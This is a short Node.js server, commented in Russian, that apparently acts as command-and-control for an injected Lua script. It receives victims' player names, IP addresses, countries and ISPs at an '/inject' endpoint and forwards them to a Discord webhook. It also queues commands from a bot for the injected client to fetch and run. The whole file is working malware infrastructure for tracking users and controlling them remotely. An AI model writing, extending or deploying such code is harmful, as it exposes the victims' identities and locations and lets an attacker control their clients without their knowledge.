const http = require('http');
const fetch = require('node-fetch');

const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК";
let lastCommand = "";
let lastArgs = [];
let lastInjectData = null;

const server = http.createServer(async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // Прием данных от Lua
  if (req.url === '/inject' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      const data = JSON.parse(body);
      lastInjectData = data;
      
      // Отправка в Discord
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🔌 **Новый инжект!**\n` +
                   `Игрок: ${data.player}\n` +
                   `IP: ${data.ip}\n` +
                   `Страна: ${data.country}\n` +
                   `Провайдер: ${data.isp || "N/A"}` +
                   `\n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``
        })
      });
      
      res.end(JSON.stringify({ status: "OK" }));
    });
    return;
  }

  // Установка команды от бота
  if (req.url === '/command' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const { command, args } = JSON.parse(body);
      lastCommand = command;
      lastArgs = args || [];
      console.log(`[CMD] ${command}`, args);
      res.end(JSON.stringify({ status: "OK" }));
    });
    return;
  }

  // Получение данных для Lua
  if (req.url === '/data' && req.method === 'GET') {
    res.end(JSON.stringify({
      command: lastCommand,
      args: lastArgs,
      injectData: lastInjectData
    }));
    lastCommand = "";
    return;
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
